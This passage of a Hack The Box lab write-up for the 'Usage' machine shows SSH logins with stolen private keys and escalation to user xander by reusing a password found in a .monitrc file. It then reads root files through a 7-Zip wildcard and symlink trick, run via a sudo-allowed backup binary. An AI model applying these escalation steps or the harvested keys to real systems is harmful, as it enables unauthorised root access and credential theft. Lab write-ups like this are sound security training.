JSb7iUaZHy80a06BmhoyNZo4I0gDknvkfk9wHDuYNHdRnJnDuWQVfbRwnJY90KSQcAaHhM
tCDkmmKv42y/I6G+nVoCaGWJHpyLzh7QAAAMEA+K8JbG54+PQryAYqC4OuGuJaojDD4pX0
s1KWvPVHaOOVA54VG4KjRFlKnPbLzGDhYRRtgB0C/40J3gY7uNdBxheO7Rh1Msx3nsTT9v
iRSpmo2FKJ764zAUVuvOJ8FLyfC20B4uaaQp0pYRgoA5G2BxjtWnCCjvr2lnj/J3BmKcz/
b2e7L0VKD4cNk9DsAWwagAK2ZRHlQ5J60udocmNBEugyGe8ztkRh1PYCB8W1Jqkygc8kpT
63zj5LQZw2/NvnAAAACmRhc2hAdXNhZ2U=
-----END OPENSSH PRIVATE KEY-----
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Usage/files]
└─$ chmod 600 dash_id_rsa
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Usage/files]
└─$ ssh -i dash_id_rsa dash@usage.htb
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Sat Apr 13 08:18:32 PM UTC 2024

  System load:           0.4794921875
  Usage of /:            66.5% of 6.53GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             224
  Users logged in:       0
  IPv4 address for eth0: 10.129.44.202
  IPv6 address for eth0: dead:beef::250:56ff:feb0:6199

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Mon Apr  8 12:35:43 2024 from 10.10.14.40
dash@usage:~$
```

## Privilege Escalation to xander through Password Reuse

Besides the `user.txt` we found a file called `.monitrc` which contained some `credentials`.

```c
dash@usage:~$ cat .monitrc 
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring 
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
```

| Username | Password         |
| -------- | ---------------- |
| admin    | 3nc0d3d_pa$$w0rd |

We checked the `/home` directory to see if there was a user which was not listed in the `/etc/passwd` file and found the user `xander`.

```c
dash@usage:/home$ ls
dash  xander
```

By `reusing` the found `password` on his account we were able to `elevate our privileges`.

```c
dash@usage:/home$ su xander
Password: 
xander@usage:/home$
```

## Privilege Escalation to root using Linux Wildcards

The user `xander` was able to execute `/usr/bin/usage_management` with `sudo`.

```c
xander@usage:~$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

We analyzed the binary real quick and noticed that it used `Linux Wildcards` in `7-Zip (7za)`.

```c
xander@usage:~$ strings /usr/bin/usage_management
/lib64/ld-linux-x86-64.so.2
chdir
__cxa_finalize
__libc_start_main
puts
system
__isoc99_scanf
perror
printf
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
Error changing working directory to /var/www/html
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
Password has been reset.
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 
<--- CUT FOR BREVITY --->
```

```c
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```

We abused the `Linux Wildcard` and linked it to the file we wanted to read when the program got `executed` as `sudo`.

- [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)
- [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z)

```c
xander@usage:~$ cd /var/www/html
```

```c
xander@usage:/var/www/html$ touch @root.txt
```

```c
xander@usage:/var/www/html$ ln -s /root/root.txt root.txt
```

We executed the program and chose option `1` to perform a `backup` which displayed the content of the file we linked by causing an `arbitrary error`.

```c
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Scanning the drive:
          
WARNING: No more files
623659de2f8e61b8535d04f58c526043

2984 folders, 17966 files, 113881828 bytes (109 MiB)                 

Creating archive: /var/backups/project.zip

Items to compress: 20950
```

## root.txt

```c
623659de2f8e61b8535d04f58c526043
```

## Post Exploitation

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Usage/files]
└─$ cat root_id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Usage/files]
└─$ ssh -i root_id_rsa root@usage.htb
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Sat Apr 13 08:26:55 PM UTC 2024

  System load:           0.02734375
  Usage of /:            67.3% of 6.53GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             233
  Users logged in:       1
  IPv4 address for eth0: 10.129.44.202
  IPv6 address for eth0: dead:beef::250:56ff:feb0:6199

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Apr  8 13:17:47 2024 from 10.10.14.40
root@usage:~#
```
